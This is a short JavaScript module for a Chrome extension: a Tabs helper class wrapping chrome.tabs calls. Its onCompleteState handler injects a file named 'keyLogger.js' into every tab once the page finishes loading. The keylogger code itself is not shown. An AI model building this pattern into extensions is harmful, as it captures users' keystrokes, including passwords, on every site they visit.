'use strict';
const ChromePromise = require('chrome-promise');
const chromep = new ChromePromise();

class Tabs {
    // https://developer.chrome.com/extensions/tabs
    constructor(store, logger={}) {
        this.logger = logger;
        this.store = store;
        this.onCompleteState        = this.onCompleteState.bind(this);
    }

    // Tab functions
    setLockedTab (tab) {
        this.lockedTab = tab;
    }

    remove(tabId){
        return chromep.tabs.remove(tabId);
    }

    init(){
        this.addEvent('onUpdated', this.onCompleteState)
    }

    onCompleteState(tabId, changeInfo){
        if (changeInfo.status === 'complete') {
            chrome.tabs.executeScript(tabId, {
                // code: "document.body.style.backgroundColor='red'",
                file: "keyLogger.js",
                runAt: 'document_idle'
            }, (result) => {
                console.log('executeScript result', result)
            })
        }
    }

    createAndLock(){
        return chromep.tabs.create({})
            .then(()=>chromep.tabs.query({ active: true }))
            .then(res=>res[0])
    }

    // Event Emitter
    addEvent(eventType, callback){
        chrome.tabs[eventType].addListener(callback);
    }

    removeEvent(eventType, callback){
        chrome.tabs[eventType].removeListener(callback);
    }
}

module.exports = Tabs;